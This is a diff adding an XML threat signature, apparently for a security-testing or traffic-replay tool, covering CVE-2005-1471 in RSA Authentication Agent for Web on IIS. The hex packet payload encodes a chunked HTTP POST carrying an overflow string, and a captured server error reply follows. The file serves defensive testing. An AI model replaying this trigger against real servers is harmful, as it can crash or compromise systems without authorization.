@@ -1,0 +1,84 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="RSA Authentication Agent for Web Buffer Overflow"/>
+    <EngDesc display="true" value="A buffer overflow vulnerability exists in the RSA Authentication Agent for Microsoft Internet Information Server (IIS). The flaw is triggered when the vulnerable component parses crafted HTTP data. Successful exploitation can allow arbitrary code to be executed with System level privileges on the target system."/>
+    <Intent display="true"/>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="RSA_Security"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="RSA_Security_RSA_Security_RSA_Authentication_Agent_for_Web_for_IIS"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="FSC20050602-01"/>
+    <CVEID display="true" value="CVE-2005-1471"/>
+    <bugtraqID display="true" value="13524"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="4a4ac1eea4cd11dd9e9e000c29da7492"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633601754507031250"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1225145728" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="L"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="M"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="N"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="O"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="P"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+      <for index="O"/>
+      <for index="P"/>
+    </for>
+    <for index="E"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="01E9" Identification="1181" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="09D4" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="AB7332E4" AckNumber="5C8D7C87" HeaderLength="08" WindowSize="16D0" Checksum="FE7B" UrgentPointer="0000" Options="0101080A033F239C00000000" Payload="504F5354202F57656249442F4949535765624167656E7449462E646C6C20485454502F312E310D0A4163636570743A202A2E2A0D0A486F73743A2031302E322E382E3136390D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A5472616E736665722D456E636F64696E673A206368756E6B65640D0A0D0A3132630D0A4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141410D0A300D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="E" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="013C" Identification="CCD3" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="0F2E" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="" destPort="" SeqNumber="5C8D7C87" AckNumber="AB733499" HeaderLength="08" WindowSize="F93B" Checksum="962C" UrgentPointer="0000" Options="0101080A00031945033F239C" Payload="485454502F312E312031303020436F6E74696E75650D0A5365727665723A204D6963726F736F66742D4949532F352E300D0A446174653A204672692C203033204A756E20323030352030333A35343A303020474D540D0A582D506F77657265642D42793A204153502E4E45540D0A4D5341532D54776F466163746F72417574683A20547275650D0A4D532D415350726F746F636F6C56657273696F6E733A20312E302C20322E300D0A4D532D415350726F746F636F6C436F6D6D616E64733A2053796E632C53656E644D61696C2C536D617274466F72776172642C536D6172745265706C792C4765744174746163686D656E742C4765744869657261726368792C4372650D0A0D0A485454502F312E312035303020496E7465726E616C20536572766572204572726F720D0A5365727665723A204D6963726F736F66742D4949532F352E300D0A446174653A204672692C203033204A756E20323030352030333A35343A303020474D540D0A582D506F77657265642D42793A204153502E4E45540D0A4D5341532D54776F466163746F72417574683A20547275650D0A4D532D415350726F746F636F6C56657273696F6E733A20312E302C20322E300D0A4D532D415350726F746F636F6C436F6D6D616E64733A2053796E632C53656E644D61696C2C536D617274466F72776172642C536D6172745265706C792C4765744174746163686D656E742C4765744869657261726368792C4372650D0A436F6E6E656374696F6E3A20636C6F73650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
